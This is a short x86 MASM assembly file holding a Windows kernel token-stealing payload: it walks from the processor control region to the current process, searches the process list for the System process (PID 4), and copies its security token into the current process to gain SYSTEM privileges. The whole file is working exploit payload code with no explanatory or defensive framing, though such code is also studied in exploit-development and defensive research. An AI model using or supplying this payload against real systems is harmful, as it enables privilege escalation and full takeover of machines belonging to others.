.686
.model flat,stdcall
assume fs:nothing

.code
payload proc
	; Save utilized register values
	push eax
	push ebx
	
	; _KPCR -> _KPRCB -> _KTHREAD (Current thread)
	xor eax, eax
	mov eax, fs:[eax + 124h]
	
	; _KTHREAD -> _EPROCESS
	mov eax, [eax + 50h]

	; Save address of current proces EPROCESS struct and loop through processes
	; to find PID 4 (system process)
	mov ebx, eax
	
CheckSystem:
	mov eax, [eax + 0b8h]
	sub eax, 0b8h
	cmp dword ptr [eax + 0b4h], 4
	jne CheckSystem

	; Copy system security token to our process token to raise our permissions to system
	mov eax, [eax + 0f8h]
	mov [ebx + 0f8h], eax

	; Restore registers and return program execution
	pop ebx
	pop eax
	ret
payload endp
end